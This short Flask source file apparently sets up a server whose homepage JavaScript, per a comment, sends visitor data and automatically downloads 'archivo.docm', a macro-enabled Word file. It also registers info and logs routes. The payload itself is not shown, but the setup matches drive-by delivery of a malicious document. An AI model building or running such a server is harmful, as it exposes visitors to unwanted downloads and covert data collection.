# Main entry point of the Flask application
from flask import Flask, send_file, render_template

# Import route blueprints
from routes.info import info_bp
from routes.logs import logs_bp

# Create Flask app
app = Flask(__name__)

# Register blueprints (modular route definitions)
app.register_blueprint(info_bp)
app.register_blueprint(logs_bp)

# Route for the homepage
@app.route('/')
def index():
    # Renders index.html which includes JavaScript to send data and auto-download the file
    return render_template("index.html")

# Route to serve the .docm file for automatic download
@app.route('/archivo.docm')
def descargar_doc():
    # Send the document from the local path to the client
    return send_file("archivo.docm", as_attachment=True)

# Start server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
